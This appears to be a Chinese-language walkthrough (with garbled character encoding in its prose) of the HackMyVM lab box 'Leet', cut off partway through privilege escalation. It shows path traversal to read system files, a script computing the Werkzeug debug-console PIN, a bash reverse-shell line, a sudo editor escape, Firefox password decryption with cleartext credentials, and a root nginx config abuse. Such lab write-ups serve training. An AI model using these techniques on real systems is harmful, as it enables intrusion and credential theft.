---
title: Leet
author: hgbe02
date: 2024-07-01 19:00:00 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Leet.html"
---

# Leet

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911415.png" alt="image-20240701145522686" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911417.png" alt="image-20240701152011662" style="zoom:50%;" />

## ä¿¡æ¯æœé›†

### ç«¯å£æ‰«æ

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ rustscan -a 192.168.0.197 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
ğŸŒHACK THE PLANETğŸŒ

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.197:22
Open 192.168.0.197:7777
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e1:5d:7c:b7:07:92:17:dc:46:76:7d:be:a9:50:43:d2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO40ZPJ7m6D4U6cVDKC0tpGfvjWc4qisOha/4Lw8EEp8kxB8aDZMMiVoZwc8s+H60NNwTUBsp9iZc/8ZgrPlgn8=
|   256 a0:f3:b3:86:93:f5:58:82:88:dd:e5:10:db:35:de:62 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJt60Bt5N10kc53Nwgf1AM9fZ+78Y0MS7Yq8tYoL7r8i
7777/tcp open  http    syn-ack Werkzeug httpd 3.0.1 (Python 3.11.2)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS POST
|_http-server-header: Werkzeug/3.0.1 Python/3.11.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ç›®å½•æ‰«æ

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ gobuster dir -u http://192.168.0.197:7777/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.197:7777/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,txt,html,php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 500) [Size: 14478]
Progress: 19456 / 1323366 (1.47%)[ERROR] Get "http://192.168.0.197:7777/1756": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.0.197:7777/1756.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.0.197:7777/1756.zip": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://192.168.0.197:7777/1756.bak": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
```

çœ‹æ¥æ‰«ä¸äº†

### æ¼æ´æ‰«æ

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ nikto -h http://192.168.0.197:7777
- Nikto v2.5.0
---------------------------------------------------------------------------
---------------------------------------------------------------------------
+ 0 host(s) tested
```

## æ¼æ´å‘ç°

### æœåŠ¡æ¢æµ‹

å°è¯•æœå¯»opensshæ¼æ´ï¼Œä½†æ˜¯æ²¡æœ‰æ”¶è·ï¼Œå°è¯•æ¢æµ‹`7777`ç«¯å£ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911419.png" alt="image-20240701152412099" style="zoom:50%;" />

æ²¡å•¥ä¸œè¥¿ï¼Œçœ‹ä¸€ä¸‹æºç ï¼Œä¹Ÿæ²¡å‘ç°å•¥ï¼Œå°è¯•è¿›è¡Œæµ‹è¯•è¿™ä¸ªè¾“å…¥æ¡†ï¼Œè¾“å…¥`whoami`ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911420.png" alt="image-20240701152510282" style="zoom:50%;" />

å°è¯•è¿›è¡Œæœç´¢ï¼Œæ‰¾åˆ°ä¸€ä¸ª[ç½‘ç«™](https://www.robertecker.com/hp/research/leet-converter.php?lang=en)ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911421.png" alt="image-20240701152944331" style="zoom:50%;" />

è¯¢é—®ä¸€ä¸‹gptï¼š

> ä½ æåˆ°çš„ "L33T converter" é€šå¸¸æŒ‡çš„æ˜¯ä¸€ä¸ªå°†æ–‡æœ¬è½¬æ¢ä¸ºæ‰€è°“çš„ "leet speak" æˆ– "1337 speak" çš„å·¥å…·ã€‚è¿™ç§è¯­è¨€è½¬æ¢æ˜¯ä¸€ç§å°†å­—æ¯æ›¿æ¢ä¸ºçœ‹èµ·æ¥ç±»ä¼¼çš„æ•°å­—æˆ–ç¬¦å·çš„ä¿šè¯­å½¢å¼ï¼Œå¸¸è§äºç½‘ç»œæ–‡åŒ–ï¼Œç‰¹åˆ«æ˜¯æ—©æœŸçš„é»‘å®¢å’Œæå®¢ç¤¾åŒºã€‚
>
> åœ¨ä½ ç»™å‡ºçš„ä¾‹å­ä¸­ï¼š
>
> - è¾“å…¥ï¼š`whoami`
> - è¾“å‡ºï¼š`wh04m1`
>
> è¿™é‡Œçš„è½¬æ¢è§„åˆ™å¤§è‡´å¦‚ä¸‹ï¼š
>
> - `o` è¢«æ›¿æ¢ä¸º `0`ï¼ˆå› ä¸ºä¸¤è€…åœ¨è§†è§‰ä¸Šç›¸ä¼¼ï¼‰
> - `a` è¢«æ›¿æ¢ä¸º `4`ï¼ˆå› ä¸º `a` åœ¨æŸäº›å­—ä½“ä¸­ç±»ä¼¼äºå€’è¿‡æ¥çš„ `4`ï¼‰
> - `i` è¢«æ›¿æ¢ä¸º `1`ï¼ˆå› ä¸ºä¸¤è€…åœ¨è§†è§‰ä¸Šç›¸ä¼¼ï¼‰
>
> è¿™ç§è½¬æ¢çš„ä¸»è¦ç›®çš„æ˜¯åœ¨èŠå¤©æˆ–è®ºå›ä¸­éšè—æ¶ˆæ¯çš„çœŸå®å«ä¹‰ï¼Œä½¿å…¶å¯¹ä¸ç†Ÿæ‚‰è¿™ç§è¯­è¨€çš„äººæ¥è¯´ä¸é‚£ä¹ˆæ˜æ˜¾ã€‚ç„¶è€Œï¼Œè¿™ä¹Ÿå¯èƒ½è¢«ç”¨äºæ¶æ„ç›®çš„ï¼Œä¾‹å¦‚æ··æ·†æˆ–éšè—æ¶æ„å‘½ä»¤æˆ–ä¿¡æ¯ã€‚

### æ–‡ä»¶åŒ…å«

å°è¯•çœ‹ä¸€ä¸‹é‚£ä¸ªæ•æ„Ÿç›®å½•ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911422.png" alt="image-20240701162147041" style="zoom:33%;" />

flask æ¡†æ¶å¯èƒ½å¼€å¯äº†è°ƒè¯•æ¨¡å¼ï¼Œçœ‹åˆ°consoleç¡®å®æ˜¯å­˜åœ¨çš„ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911423.png" alt="image-20240701162225439" style="zoom:33%;" />

ä½†æ˜¯è¢«é”ä½äº†ï¼Œå°è¯•çœ‹ä¸€ä¸‹å…¶ä»–ç›®å½•ï¼Œå‘ç°ä¸‹è½½åœ°å€ä¸ºï¼š`http://192.168.0.197:7777/download?filename=converted_text.txt`

çœ‹ä¸€ä¸‹æ˜¯å¦å¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼š

```bash
http://192.168.0.197:7777/download?filename=../../../../../../../../etc/passwd
```

å‘ç°å¯ä»¥æ­£å¸¸è¯»å–æ–‡ä»¶ï¼š

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
riva:x:1000:1000:,,,:/home/riva:/bin/bash
```

### è®¡ç®—pin

å°è¯•è®¡ç®—pinï¼Œå¯ä»¥å‚è€ƒ`https://github.com/wdahlenburg/werkzeug-debug-console-bypass`ï¼š

```python
# get_pin.py
import hashlib
from itertools import chain
 
probably_public_bits = [
    'riva',
    'flask.app',
    'Flask',
    '/opt/project/venv/lib/python3.11/site-packages/flask/app.py'
]
 
private_bits = [
    '8796756626246',
    'd4e6cb65d59544f3331ea0425dc555a1'
]
 
h = hashlib.sha1() # or hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')
 
cookie_name = '__wzd' + h.hexdigest()[:20]
 
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
 
rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
 
print(rv)
```

è¿›è¡Œæ”¹å†™ï¼š

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ python                                                                                            
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0800278dcb46
8796756626246
```

ç„¶åè¯»å–ä¸‰ä¸ªæ–‡ä»¶ï¼š

```bash
/etc/machine-id
# f6791f240ce6407ea271e86b78ac3bdb
/proc/sys/kernel/random/boot_id
# 
/proc/self/cgroup
# 
```

ä½†æ˜¯æœ‰çš„è¯»ä¸åˆ°ï¼Œåæ¥`ta0`ç¥å‘Šè¯‰æˆ‘windowsè¯»ä¸å‡ºæ¥ï¼Œä½†æ˜¯kaliå¯ä»¥ã€‚ã€‚ã€‚ã€‚ã€‚

å°è¯•è¿›è¡Œè¯»å–ï¼Œå› ä¸ºå‰é¢çœ‹äº†ä¸€ä¸‹hostsæ–‡ä»¶å‘ç°å­˜åœ¨åŸŸåè§£æï¼Œå°è¯•è¿›è¡Œé…ç½®ï¼š

```text
127.0.0.1	localhost
127.0.1.1	leet.hmv

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

å°è¯•è¿›è¡Œcurlï¼š

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
10.160.107.159  adria.hmv

::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

192.168.0.165   leet.hmv

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ curl http://leet.hmv:7777/download?filename=../../../../../../../../etc/passwd
^C

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ wget http://leet.hmv:7777/download?filename=../../../../../../../../etc/passwd
--2024-07-01 05:37:27--  http://leet.hmv:7777/download?filename=../../../../../../../../etc/passwd
Resolving leet.hmv (leet.hmv)... 192.168.0.165
Connecting to leet.hmv (leet.hmv)|192.168.0.165|:7777... connected.
HTTP request sent, awaiting response... ^C
```

å°è¯•ä½¿ç”¨kaliçš„æµè§ˆå™¨è¿›è¡Œè¯»å–ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911424.png" alt="image-20240701174356662" style="zoom:33%;" />

ä¹Ÿæ˜¯ç©ºçš„ã€‚ã€‚ã€‚ã€‚ã€‚å°è¯•å¤šè¯»å‡ æ¬¡ï¼Œçªç„¶åˆå¥½äº†ï¼ˆä¸­é—´é‚£ä¸ª`boot_id`è¯»äº†7æ¬¡ï¼Œè™½ç„¶æ²¡å•¥ç”¨ï¼‰ï¼š

```bash
/etc/machine-id
# f6791f240ce6407ea271e86b78ac3bdb
/proc/sys/kernel/random/boot_id
# da68b9a7-336e-40df-879a-f38a6447bfe9
/proc/self/cgroup
# 0::/system.slice/flaskapp.service
```

å°è¯•è¿›è¡Œè·å–æœºæ¢°ç ï¼š

```python
# tools.py
machine_id = b""
for filename in "machine-id", "boot_id":
    try:
        with open(filename, "rb") as f:
            value = f.readline().strip()
    except OSError:
        continue
 
    if value:
        machine_id += value
        break
try:
    with open("cgroup", "rb") as f:
        machine_id += f.readline().strip().rpartition(b"/")[2]
except OSError:
    pass
 
print(machine_id)
```

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ vim tools.py  

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ echo "f6791f240ce6407ea271e86b78ac3bdb" > machine-id

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ echo "da68b9a7-336e-40df-879a-f38a6447bfe9" > boot_id

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ echo "0::/system.slice/flaskapp.service" > cgroup    

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ chmod +x tools.py                 

â”Œâ”€â”€(kaliğŸ’€kali)-[~/temp/Leet]
â””â”€$ python3 tools.py 
b'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'
```

```python
# exp.py
import hashlib
from itertools import chain
 
probably_public_bits = [
    'riva',
    'flask.app',
    'Flask',
    '/opt/project/venv/lib/python3.11/site-packages/flask/app.py'
]
 
private_bits = [
    '8796760530867',
    'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'
]
 
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
 
cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

è¯•äº†å¾ˆä¹…ä¸€ç›´ä¸è¡Œï¼Œçµæœºä¸€åŠ¨`riva`æ¢æˆäº†`www-data`ï¼ŒæˆåŠŸäº†ã€‚ã€‚ã€‚ã€‚ã€‚

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911425.png" alt="image-20240701180327809" style="zoom:33%;" />

å°è¯•æå–shellï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911426.png" alt="image-20240701180852578" style="zoom:50%;" />

```bash
__import__('os').popen('whoami').read();
__import__('os').system('bash -c "bash -i >& /dev/tcp/192.168.0.143/1234 0>&1"')
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911427.png" alt="image-20240701181425747" style="zoom:33%;" />

## ææƒ

### microææƒ

```bash
(remote) www-data@leet.hmv:/opt/project$ cd ~
(remote) www-data@leet.hmv:/var/www$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Feb 14 21:00 .
drwxr-xr-x 12 root root 4096 Feb 12 11:27 ..
drwxr-xr-x  2 root root 4096 Feb 14 21:00 html
(remote) www-data@leet.hmv:/var/www$ cd html
(remote) www-data@leet.hmv:/var/www/html$ sudo -l
Matching Defaults entries for www-data on leet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on leet:
    (riva) NOPASSWD: /usr/bin/micro
(remote) www-data@leet.hmv:/var/www/html$ file /usr/bin/micro
/usr/bin/micro: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=ZGN4-PEgidp0GQFC2DhN/npFl-ZmzE1stSjkF3ozz/9KOuVtA_3CSCIt1HL-lM/Huh9eaBrgytFpqcC9L-9, stripped
(remote) www-data@leet.hmv:/var/www/html$ sudo -u rive /usr/bin/micro
sudo: unknown user rive
sudo: error initializing audit plugin sudoers_audit
```

å‘ç°æ˜¯ä¸€æ¬¾ç¼–è¾‘å™¨ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911428.png" alt="image-20240701181844485" style="zoom:50%;" />

```bash
(remote) www-data@leet.hmv:/var/www/html$ /usr/bin/micro -h
Usage: micro [OPTIONS] [FILE]...
-clean
        Cleans the configuration directory
-config-dir dir
        Specify a custom location for the configuration directory
[FILE]:LINE:COL (if the `parsecursor` option is enabled)
+LINE:COL
        Specify a line and column to start the cursor at when opening a buffer
-options
        Show all option help
-debug
        Enable debug mode (enables logging to ./log.txt)
-version
        Show the version number and information

Micro's plugin's can be managed at the command line with the following commands.
-plugin install [PLUGIN]...
        Install plugin(s)
-plugin remove [PLUGIN]...
        Remove plugin(s)
-plugin update [PLUGIN]...
        Update plugin(s) (if no argument is given, updates all plugins)
-plugin search [PLUGIN]...
        Search for a plugin
-plugin list
        List installed plugins
-plugin available
        List available plugins

Micro's options can also be set via command line arguments for quick
adjustments. For real configuration, please use the settings.json
file (see 'help options').

-option value
        Set `option` to `value` for this session
        For example: `micro -syntax off file.c`

Use `micro -options` to see the full list of configuration options
```

å»å®˜ç½‘ç¿»æ–‡æ¡£ï¼Œå‘ç°ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202407011911429.png" alt="image-20240701182504624" style="zoom:50%;" />

å°è¯•è¿›è¡Œåˆ©ç”¨ï¼š

```bash
(remote) www-data@leet.hmv:/var/www/html$ sudo -u riva /usr/bin/micro
ctrl+b 
$ /bin/bash
riva@leet:/var/www/html$ 
```

### firefoxå¯†ç æå–

```bash
(remote) www-data@leet.hmv:/var/www/html$ sudo -u riva /usr/bin/micro
riva@leet:/var/www/html$ cd ~
riva@leet:~$ ls -la
total 40
drwxr-xr-x 6 riva riva 4096 Feb 14 21:00 .
drwxr-xr-x 3 root root 4096 Feb 14 21:00 ..
lrwxrwxrwx 1 riva riva    9 Feb 11 15:58 .bash_history -> /dev/null
-rw-r--r-- 1 riva riva  220 Feb 14 21:00 .bash_logout
-rw-r--r-- 1 riva riva 3526 Feb 14 21:00 .bashrc
drwxr-xr-x 3 riva riva 4096 Feb 14 21:00 .config
drwxr-xr-x 3 riva riva 4096 Feb 14 21:00 .local
drwx------ 4 riva riva 4096 Feb 14 21:00 .mozilla
-rw-r--r-- 1 riva riva  807 Feb 14 21:00 .profile
drwx------ 2 riva riva 4096 Feb 14 21:00 .ssh
-rwx------ 1 riva riva   33 Feb 14 21:00 user.txt
riva@leet:~$ cat user.txt 
3a5cf7b35876169c280229c213ed63c1
riva@leet:~$ sudo -l
[sudo] password for riva: 
Sorry, try again.
[sudo] password for riva: 
sudo: 1 incorrect password attempt
riva@leet:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
riva:x:1000:1000:,,,:/home/riva:/bin/bash
riva@leet:~$ ls -la /etc/shadow
-rw-r----- 1 root shadow 779 Feb 11 15:57 /etc/shadow
riva@leet:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/mount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chfn
riva@leet:~$ ls -la
total 40
drwxr-xr-x 6 riva riva 4096 Feb 14 21:00 .
drwxr-xr-x 3 root root 4096 Feb 14 21:00 ..
lrwxrwxrwx 1 riva riva    9 Feb 11 15:58 .bash_history -> /dev/null
-rw-r--r-- 1 riva riva  220 Feb 14 21:00 .bash_logout
-rw-r--r-- 1 riva riva 3526 Feb 14 21:00 .bashrc
drwxr-xr-x 3 riva riva 4096 Feb 14 21:00 .config
drwxr-xr-x 3 riva riva 4096 Feb 14 21:00 .local
drwx------ 4 riva riva 4096 Feb 14 21:00 .mozilla
-rw-r--r-- 1 riva riva  807 Feb 14 21:00 .profile
drwx------ 2 riva riva 4096 Feb 14 21:00 .ssh
-rwx------ 1 riva riva   33 Feb 14 21:00 user.txt
riva@leet:~$ cd .mozilla/
riva@leet:~/.mozilla$ ls -la
total 16
drwx------ 4 riva riva 4096 Feb 14 21:00 .
drwxr-xr-x 6 riva riva 4096 Feb 14 21:00 ..
drwx------ 2 riva riva 4096 Feb 14 21:00 extensions
drwx------ 6 riva riva 4096 Feb 14 21:00 firefox
riva@leet:~/.mozilla$ cd firefox/
riva@leet:~/.mozilla/firefox$ ls -la
total 32
drwx------  6 riva riva 4096 Feb 14 21:00  .
drwx------  4 riva riva 4096 Feb 14 21:00  ..
drwx------  3 riva riva 4096 Feb 14 21:00 'Crash Reports'
drwx------ 16 riva riva 4096 Feb 14 21:00  guu30cui.default-esr
-rw-r--r--  1 riva riva   58 Feb 14 21:00  installs.ini
drwx------  2 riva riva 4096 Feb 14 21:00 'Pending Pings'
-rw-r--r--  1 riva riva  247 Feb 14 21:00  profiles.ini
drwx------  2 riva riva 4096 Feb 14 21:00  zbznfk37.default
riva@leet:~/.mozilla/firefox$ pwd
/home/riva/.mozilla/firefox
riva@leet:~/.mozilla/firefox$ cd /tmp
riva@leet:/tmp$ vim firefox_decrypt.py
bash: vim: command not found
riva@leet:/tmp$ vi firefox_decrypt.py
riva@leet:/tmp$ chmod +x firefox_decrypt.py 
riva@leet:/tmp$ python -V
bash: python: command not found
riva@leet:/tmp$ python3 -V
Python 3.11.2
riva@leet:/tmp$ python3 firefox_decrypt.py 
Select the Mozilla profile you wish to decrypt
1 -> zbznfk37.default
2 -> guu30cui.default-esr
1
2024-07-01 12:35:59,994 - ERROR - Couldn't initialize NSS, maybe '/home/riva/.mozilla/firefox/zbznfk37.default' is not a valid profile?
riva@leet:/tmp$ python3 firefox_decrypt.py 
Select the Mozilla profile you wish to decrypt
1 -> zbznfk37.default
2 -> guu30cui.default-esr
2

Website:   chrome://FirefoxAccounts
Username: '1db9561103ca4adc9afa6357c0a0b554'
Password: '{"version":1,"accountData":{"scopedKeys":{"https://identity.mozilla.com/apps/oldsync":{"kid":"1603273389635-IxsZ6HpGK9fL9tUfdcBqwA","k":"Q8lFF-E91kvogabSQ2yjKj7k2JHX30UDeHEriaxaCY5slUVmtQvP-e3is5GxBiUKkG3g4dQLbFRsVOYeMkjNpg","kty":"oct"},"sync:addon_storage":{"kid":"1603273389635-Ng9dJrdpVFqEoBs-R3LaTMKTiSWhWypqfmg9MJDby4U","k":"L8MGJk3tWVlmN9Sm-MmdauxuQ38fIl--NziTjg_AmjO51_-vHo70OELMwif8kqn2zE3Yqg30BLw1ndNplRzGCA","kty":"oct"}},"kSync":"43c94517e13dd64be881a6d2436ca32a3ee4d891d7df450378712b89ac5a098e6c954566b50bcff9ede2b391b106250a906de0e1d40b6c546c54e61e3248cda6","kXCS":"231b19e87a462bd7cbf6d51f75c06ac0","kExtSync":"2fc306264ded59596637d4a6f8c99d6aec6e437f1f225fbe3738938e0fc09a33b9d7ffaf1e8ef43842ccc227fc92a9f6cc4dd8aa0df404bc359dd369951cc608","kExtKbHash":"360f5d26b769545a84a01b3e4772da4cc2938925a15b2a6a7e683d3090dbcb85"}}'

Website:   http://leet.hmv
Username: 'riva'
Password: 'PGH$2r0co3L5QL'

Website:   https://hackmyvm.eu
Username: 'riva'
Password: 'lovelove80'
```

ä¸­é—´ä½¿ç”¨çš„å·¥å…·æ˜¯ï¼šhttps://github.com/unode/firefox_decrypt

### nginxææƒ

å¾—åˆ°å¯†ç ä»¥åï¼Œå‘ç°rootæƒé™çš„nginxï¼Œå‚è€ƒhttps://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406è¿›è¡Œææƒï¼š

```bash
riva@leet:/tmp$ cd ~
riva@leet:~$ sudo -l
[sudo] password for riva: 
Sorry, try again.
[sudo] password for riva: 
Matching Defaults entries for riva on leet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User riva may run the following commands on leet:
    (root) /usr/sbin/nginx
```

å°è¯•åˆ©ç”¨ä¸‹å±è„šæœ¬ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå†putä¸Šä¼ ææƒï¼š

```bash
riva@leet:~$ cd /tmp
riva@leet:/tmp$ cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
EOF
riva@leet:/tmp$ cat /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
riva@leet:/tmp$ sudo -l
Matching Defaults entries for riva on leet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User riva may run the following commands on leet:
    (root) /usr/sbin/nginx
riva@leet:/tmp$ sudo -u root nginx -c /tmp/nginx_pwn.conf
2024/07/01 12:45:40 [emerg] 809#809: bind() to 0.0.0.0:1339 failed (98: Address already in use)
2024/07/01 12:45:40 [emerg] 809#809: bind() to 0.0.0.0:1339 failed (98: Address already in use)
2024/07/01 12:45:40 [emerg] 809#809: bind() to 0.0.0.0:1339 failed (98: Address already in use)
2024/07/01 12:45:40 [emerg] 809#809: bind() to 0.0.0.0:1339 failed (98: Address already in use)
2024/07/01 12:45:40 [emerg] 809#809: bind() to 0.0.0.0:1339 failed (98: Address already in use)
2024/07/01 12:45:40 [emerg] 809#809: still could not bind()
riva@leet:/tmp$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/riva/.ssh/id_rsa): root_shell
Enter passphrase (empty for no passphrase): 
